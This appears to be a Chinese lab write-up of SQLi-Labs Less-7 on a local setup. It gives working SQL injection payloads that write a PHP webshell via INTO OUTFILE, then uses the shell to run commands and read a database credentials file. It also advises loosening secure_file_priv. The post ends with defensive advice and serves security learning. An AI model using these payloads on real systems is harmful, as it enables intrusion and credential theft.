---
title: "SQLi-Labs 文件导出注入：权限条件与防御"
description: 在 SQLi-Labs 授权环境中分析文件导出型 SQL 注入，重点说明数据库文件权限、secure_file_priv、目标路径和 Web 执行条件。
excerpt: 在 SQLi-Labs 授权环境中分析文件导出型 SQL 注入，重点说明数据库文件权限、secure_file_priv、目标路径和 Web 执行条件。
author: Lee
disableNunjucks: true
date: 2025-05-15 20:54:42
updated: 2026-09-04 00:00:00
categories:
  - SQL注入专题
tags:
  - SQLi-Labs
  - SQL注入
  - 文件写入
  - MySQL
article_status: 待复验
difficulty: 中级
original_sources:
  - https://blog.csdn.net/2403_88102829/article/details/147981770
---

> **文章状态：待复验**  
> 本文由 Lee 的 CSDN 原创学习记录迁移并重新整理。以下操作仅限自建环境、CTF 与明确授权靶场，请勿用于未授权目标。

## 学习目标

- 理解数据库文件导出能力与 SQL 注入的组合风险
- 识别 FILE 权限和 secure_file_priv 等必要条件
- 区分“能够注入”“能够写文件”和“能够执行代码”

## 实验说明

- 难度：中级
- 范围：本地或公开授权靶场
- 复验状态：正文已完成格式迁移，关键结论将在后续使用固定环境重新验证

## 原始实验记录

### 一：目标

通过sql注入将php代码写入网站目录，通过这个php文件执行命令

### 二：确认前置条件

#### %secure\_file\_priv%

首先我们需要Mysql是否允许导出文件

先尝试在网页中sql注入，检查导出权限

```sql
?id=1')) union select 1,@@secure_file_priv,3-- -
```

检查失败

![实验截图 1](/images/csdn/147981770/01.png)

换方法，通过Mysql命令行直接执行：

win+r→powershell→mysql -u root -p→password

然后检查：

```php
show variables like '%secure_file_priv%';
```

窗口显示如下

 

![实验截图 2](/images/csdn/147981770/02.png)

**这里value有三种可能的值：**

- Null：禁止所有导入导出操作（最严格）

- 空字符串`''`：允许所有目录的导入导出（有安全风险）

- 指定路径：只允许该目录下的文件操作


如果值是空or是路径，继续攻击

如果值为NULL，那么注入一定失败，需要我们修改配置 ，方法如下：

在你的Mysql文件夹里找到my.ini，从段落的中间部分找到 \[mysqld\]，在下面一行加上

```sql
secure_file_priv = ""
```

保存，服务里面重启动Mysql，然后 win+r→powershell→mysql -u root -p→password，再次检查

![实验截图 3](/images/csdn/147981770/03.png)

可以看到Value值变成空，说明我们修改成功了 ~

三：确定注入类型

首先输入 ?id=1'，报错

![实验截图 4](/images/csdn/147981770/04.png)

### 尝试单引号+括号，?id=1')，报错

![实验截图 5](/images/csdn/147981770/05.png)

 尝试?id=1'))--+，页面恢复正常！！

![实验截图 6](/images/csdn/147981770/06.png)

### 所以这一关要闭合 '))

### 四：写一个webshell文件

首先用order by确定有三行

##### payload:

```sql
http://localhost/sqli-labs/Less-7/?id=1')) union select 1,
'<?php system($_GET["cmd"]);?>',
3
into outfile
'D:/nginx-1.27.5/html/shell.php'-- -
```

php代码：<?php system($\_GET\["cmd"\]);?>

路径按照网站的真实路径来

\*\*注意：路径使用双反斜杠\\\\

#### **into outfile 文件导出:**

```sql
select 内容 into outfile '文件路径';
```

使用条件：

1.Mysql有权限

2.知道目标路径的物理路径

3.secure\_file\_priv允许操作

####  列出网站目录：

```sql
http://localhost/shell.php?cmd=dir D:\nginx-1.27.5\html\
```

 这里面可以看出我们的绝对路径是否正确

![实验截图 7](/images/csdn/147981770/07.png)

这样显示更清楚一点

```sql
http://localhost/shell.php?cmd=dir
```

![实验截图 8](/images/csdn/147981770/08.png)

整理我们得到的数据！

```sql
D:\nginx-1.27.5\html\  # 当前目录路径
├── 50x.html           # Nginx错误页面
├── index.html         # 默认首页
├── index.php          # PHP入口文件
├── shell.php          # 刚写入的WebShell
└── sqli-labs/         # SQLi-Labs靶场目录
```

再来几个查询！

#### 查看服务器用户名

```sql
http://localhost/shell.php?cmd=whoami
```

 

![实验截图 9](/images/csdn/147981770/09.png)

读取数据库配置文件（获取账号密码）

```sql
http://localhost/shell.php?cmd=type D:\nginx-1.27.5\sqli-labs\sql-connections\db-creds.inc
```

![实验截图 10](/images/csdn/147981770/10.png)

## 防御与复盘

- 业务数据库账户不授予 FILE 等非必要高权限。
- 启用并限制 secure_file_priv，数据库进程与 Web 目录采用最小文件权限。
- 使用参数化查询，同时监控包含 outfile、dumpfile 等关键行为的异常语句。

## 原文出处

- [CSDN 原创记录](https://blog.csdn.net/2403_88102829/article/details/147981770)
